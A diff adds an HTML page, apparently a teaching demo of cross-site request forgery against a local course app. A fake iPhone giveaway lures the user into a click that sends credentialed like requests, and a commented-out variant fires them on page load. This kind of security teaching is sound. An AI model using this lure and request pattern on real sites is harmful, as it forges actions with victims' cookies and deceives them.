@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Ganhe um iPhone 15 Pro GRÁTIS!</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+      }
+      .container {
+        text-align: center;
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        padding: 40px;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        max-width: 500px;
+      }
+      h1 {
+        font-size: 2.5em;
+        margin: 0 0 20px 0;
+      }
+      p {
+        font-size: 1.2em;
+        margin: 20px 0;
+      }
+      .btn {
+        background: #ff6b6b;
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 1.2em;
+        border-radius: 50px;
+        cursor: pointer;
+        transition: transform 0.2s;
+      }
+      .btn:hover {
+        transform: scale(1.05);
+      }
+      .fake-loader {
+        display: none;
+        margin-top: 20px;
+      }
+      .fake-loader.active {
+        display: block;
+      }
+      .spinner {
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 4px solid white;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .debug {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff00;
+        padding: 15px;
+        border-radius: 8px;
+        font-family: monospace;
+        font-size: 12px;
+        max-width: 300px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🎁 Parabéns!</h1>
+      <p>
+        Você foi selecionado para ganhar um
+        <strong>iPhone 15 Pro</strong> GRÁTIS!
+      </p>
+      <p>Clique no botão abaixo para reivindicar seu prêmio:</p>
+      <button class="btn" onclick="claim()">🎉 RESGATAR AGORA</button>
+
+      <div class="fake-loader" id="loader">
+        <div class="spinner"></div>
+        <p>Processando seu prêmio...</p>
+      </div>
+    </div>
+
+    <!-- ⚠️ ATAQUE CSRF: Iframes escondidos que disparam likes -->
+    <!-- Cada iframe faz um request para dar like em um post diferente -->
+    <iframe id="csrf1" style="display: none"></iframe>
+    <iframe id="csrf2" style="display: none"></iframe>
+    <iframe id="csrf3" style="display: none"></iframe>
+    <iframe id="csrf4" style="display: none"></iframe>
+    <iframe id="csrf5" style="display: none"></iframe>
+
+    <!-- Debug console para demonstração -->
+    <div class="debug" id="debug">
+      <strong>🔍 Debug Console (Demo):</strong><br />
+      <div id="log"></div>
+    </div>
+
+    <script>
+      // ⚠️ CONFIGURAÇÃO DO ATAQUE
+      const TARGET_URL = "http://localhost:3000";
+
+      // IDs dos posts para dar like (ajuste conforme seu banco)
+      const POST_IDS = [1, 2, 3, 4, 5];
+
+      // Função de log para demonstração
+      function log(message) {
+        const logDiv = document.getElementById("log");
+        const timestamp = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `<br>[${timestamp}] ${message}`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+      }
+
+      // Função que o usuário clica (falso botão de prêmio)
+      function claim() {
+        document.getElementById("loader").classList.add("active");
+        log("🎯 Usuário clicou no botão...");
+
+        // Disparar ataques CSRF
+        executeCSRFAttack();
+      }
+
+      // ⚠️ ATAQUE CSRF: Dispara likes automáticos
+      function executeCSRFAttack() {
+        log("⚠️ Iniciando ataque CSRF...");
+
+        POST_IDS.forEach((postId, index) => {
+          setTimeout(() => {
+            // ✅ Usar fetch em vez de form (mais moderno e confiável)
+            fetch(`${TARGET_URL}/api/like`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              credentials: "include", // ⚠️ Envia cookies automaticamente!
+              body: JSON.stringify({ postId: postId }),
+            })
+              .then((response) => response.json())
+              .then((data) => {
+                if (data.success) {
+                  log(`✅ Like enviado para Post #${postId} - SUCESSO!`);
+                } else {
+                  log(
+                    `⚠️ Like para Post #${postId} - Falhou: ${
+                      data.error || "Erro desconhecido"
+                    }`
+                  );
+                }
+              })
+              .catch((error) => {
+                log(`❌ Erro no Post #${postId}: ${error.message}`);
+              });
+
+            // Feedback visual no último
+            if (index === POST_IDS.length - 1) {
+              setTimeout(() => {
+                log("✅ Ataque completo!");
+                log("🤖 5 likes foram disparados automaticamente");
+                log("🍪 Cookies do usuário foram enviados");
+                log("⚠️ Usuário nem percebeu o ataque!");
+
+                // Mostrar "sucesso" falso
+                document.querySelector(".container").innerHTML = `
+                  <h1>✅ Prêmio Confirmado!</h1>
+                  <p>Seu iPhone será enviado em até 30 dias...</p>
+                  <p><small>(Obviamente isso é falso - você foi atacado por CSRF!)</small></p>
+                  <p style="margin-top: 20px; font-size: 0.9em;">
+                    <strong>Volte para o Code Connect e recarregue a página para ver os likes aumentarem! 👍</strong>
+                  </p>
+                `;
+              }, 3000);
+            }
+          }, index * 500); // Espaçar os requests
+        });
+      }
+
+      // ⚠️ VARIANTE ZERO-CLICK: Ataque automático ao carregar a página
+      // Descomente a linha abaixo para ataque sem interação do usuário
+      // window.onload = () => { executeCSRFAttack(); };
+
+      // Log inicial
+      log("🌐 Página maliciosa carregada");
+      log("⏳ Aguardando usuário clicar...");
+    </script>
+  </body>
+</html>
